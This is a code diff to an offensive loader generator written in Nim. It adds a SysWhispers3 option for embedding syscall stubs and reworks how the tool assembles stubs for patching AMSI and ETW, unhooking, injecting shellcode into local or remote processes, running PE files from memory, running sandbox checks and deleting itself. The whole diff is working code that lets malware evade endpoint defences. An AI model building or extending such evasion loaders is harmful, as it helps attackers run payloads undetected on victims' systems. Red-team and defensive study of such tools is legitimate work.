@@ -19,6 +19,7 @@ import HellsgateStubs
 import CustomEvasionStubs
 import GetSyscallStubs
 import SandboxStubs
+import Whispers
 
 
 from system import io
@@ -55,7 +56,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.4
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -86,6 +87,7 @@ Options:
   --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
+  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
@@ -140,6 +142,8 @@ var
     peload: bool = false
     callobfs: bool = false
     hellsgate: bool = false
+    syswhispers: bool = false
+    getfreshstub: bool = true
     selfdelete: bool = false
     remoteAMSIpatch: bool = false
     remoteETWpatch: bool = false
@@ -251,6 +255,11 @@ if args["--peinject"]:
 
 if args["--hellsgate"]:
   hellsgate = true
+  getfreshstub = false
+
+if args["--syswhispers"]:
+  syswhispers = true
+  getfreshstub = false
 
 if args["--replace"]:
   replace = true
@@ -720,7 +729,8 @@ if(gosleep):
     stub.add(SleepStubFirst)
     stub.add(SleepStubSecond)
 
-if (localinject or hellsgate == false):
+
+if (getfreshstub):
     stub.add(GetSyscallStub)
     stub.add(NtProtectSyscallStart)
 
@@ -734,7 +744,7 @@ if(unhook):
         stub.add(HellsgateWriteDelegate)
         stub.add(HellsgateNtCloseDelegate)
         stub.add(HellsgateUnhookStub)
-    else:
+    elif(getfreshstub):
         stub.add(DInvokeUnhookStubs)
         stub.add(Winimleanstub)
         stub.add(NtProtectVirtualMemoryDelegate)
@@ -749,7 +759,7 @@ else:
         stub.add(HellsgateProtectDelegate)
         stub.add(HellsgateWriteDelegate)
         stub.add(HellsgateNtCloseDelegate)
-    else:
+    elif(getfreshstub):
         stub.add(NtProtectVirtualMemoryDelegate)
         stub.add(NtWriteVirtualMemoryDelegate)
 
@@ -762,20 +772,26 @@ if (AMSI or ETW or peload or (localinject == false) or selfdelete):
     if (selfdelete):
         stub.add(DInvokeSelfDeleteStubs)
         stub.add(FileDeleteStub)
-        
+
 if (localinject):
+    if ((AMSI or ETW) and syswhispers):
+        stub.add(WhispersAMSIETWImportStub)
     if (AMSI):
+        if (syswhispers):
+            stub.add(WhispersAMSIPatchStub)
         if (hellsgate):
             stub.add(HellsgateAMSIPatchStub)
-        else:
+        elif(getfreshstub):
             stub.add(AMSIStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
         else:
+            if (syswhispers):
+                stub.add(WhispersETWPatchStub)
             if (hellsgate):
                 stub.add(HellsgateETWPatchStub)
-            else:
+            elif(getfreshstub):
                 stub.add(ETWPatchStub)
 
 if (remoteETWpatch or remoteAMSIpatch):
@@ -802,7 +818,7 @@ if (peload):
         if (hellsgate):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsPELoadStub)
-        else:
+        elif(getfreshstub):
             stub.add(NtAllocateVirtualMemoryDelegate)
             stub.add(ProtectWriteAllocSyscalls)
             stub.add(PELoadStub)
@@ -833,13 +849,15 @@ if (peload):
 
 if (shellcode):
     if (localinject):
-        stub.add(LocalInjectDelegates)
-        stub.add(ShellcodelocalStub)
+        if (getfreshstub):
+            stub.add(LocalInjectDelegates)
+            stub.add(ShellcodelocalStub)
         if (hellsgate):
             stub.add(HellsgateAllocDelegate)
             stub.add(HellsgateLocalInjectStub)
     else:
-        stub.add(RemoteProcImportStub)
+        if (getfreshstub):
+            stub.add(RemoteProcImportStub)
         if (hellsgate):
             stub.add(HellsgateNtOpenProcessDelegate)
             stub.add(HellsgateAllocDelegate)
@@ -862,7 +880,7 @@ if (shellcode):
                     stub.add(HellsgateRemotePatchAMSIStub)
                 stub.add(HellsShellcoderemoteinjectStub_customprocthird)
                 stub.add(HellsShellcoderemoteinjectStub)
-        else:
+        elif (getfreshstub):
             stub.add(RemoteInjectDelegates)
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
@@ -934,9 +952,9 @@ elif system.hostOS == "linux":
 
 
 when system.hostOS == "windows":
-    basicCompileFlags = "nim c -d:release --hint:all:off --warning:all:off -d:danger -d:strip --opt:size "
+    basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
 elif system.hostOS == "linux":
-    basicCompileFlags = "nim c -d:release -d=mingw --hint:all:off --warning:all:off -d:danger -d:strip --opt:size "
+    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
 
 
 if (compileX86):
@@ -958,7 +976,7 @@ else:
 if (hellsgate):
     echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
     discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
-else:
+elif(syswhispers != true):
     basicCompileFlags.add("--passc=-flto --passl=-flto ")
 
 # for e.g. CNA Scripts
@@ -972,7 +990,7 @@ basicCompileFlags.add(fmt"--out={outfile} Loader.nim")
 
 if debugMode:
     basicCompileFlags = basicCompileFlags.replace("-d:release", "")
-    basicCompileFlags = basicCompileFlags.replace("--hint:all:off --warning:all:off -d:danger -d:strip --opt:size", "")
+    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
     basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")
 
 
